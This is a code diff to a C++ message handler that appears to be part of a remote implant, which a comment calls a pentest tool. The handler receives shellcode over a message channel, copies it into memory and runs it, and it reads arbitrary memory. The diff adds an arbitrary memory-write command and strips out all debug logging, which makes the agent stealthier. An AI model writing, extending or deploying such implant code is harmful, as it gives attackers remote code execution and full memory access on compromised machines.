@@ -27,7 +27,6 @@ string to_hex(const uint8_t* data, size_t len) {
 
 string handleMessage(string& msg, PVOID mem) {
     if (msg.empty()) {
-        cout << "Empty message" << endl;
         return "";
     }
 
@@ -35,16 +34,12 @@ string handleMessage(string& msg, PVOID mem) {
 
     switch (type) {
         case 0x00:{
-            cout << "Action 0 triggered (handshake)" << endl;
             string retval = create_handshake();
             return retval;
         }
         case 0x01:{
-            cout << "Action 1 triggered (exec)" << endl;
-            printStringAsHex(msg);
             QWORD shellcode_size = *((QWORD*)msg.substr(1).c_str());
             string shellcode = msg.substr(1+8,shellcode_size);
-            cout << "Shellcode size = " << (hex) << shellcode_size << endl;
             memcpy(mem, shellcode.c_str(), shellcode_size);
             ShellcodeFunc exec = (ShellcodeFunc)(mem);
             unsigned long long retval = exec();
@@ -53,11 +48,9 @@ string handleMessage(string& msg, PVOID mem) {
             break;
         }
         case 0x02: {
-        cout << "Action 2 triggered (read)" << endl;
         
         // Check if message has enough header data (1 byte type + 8 bytes addr + 8 bytes len)
         if (msg.size() < 17) {
-            cout << "Invalid read request: Message too short" << endl;
             return string(1, 0x01) + "ERROR: SHORT_MSG";
         }
 
@@ -67,7 +60,6 @@ string handleMessage(string& msg, PVOID mem) {
         memcpy(&startAddr, msg.data() + 1, 8);
         memcpy(&readLen, msg.data() + 9, 8);
 
-        cout << "Reading " << dec << readLen << " bytes from 0x" << hex << startAddr << endl;
 
         // Use a stringstream to build the hex response or return raw bytes
         // For a pentest tool, returning raw bytes is usually more efficient
@@ -82,16 +74,19 @@ string handleMessage(string& msg, PVOID mem) {
         break;
         }
 
-        case 0x03:
-            cout << "Action 2 triggered" << endl;
-            break;
+        case 0x03:{
+            uint64_t writeAddr;
+            uint64_t writeLen;
+            memcpy(&writeAddr, msg.data()+1, 8);
+            memcpy(&writeLen, msg.data()+9, 8);
 
-        case 0x04:
-            cout << "Action 3 triggered" << endl;
-            break;
+            memcpy((PVOID)writeAddr, msg.data()+17, writeLen);
+            string s_retval = string(1, 0x01);
+            return s_retval;
 
+            break;
+        }
         default:
-            cout << "Unknown action: 0x" << hex << (int)type << endl;
             break;
     }
     return "";
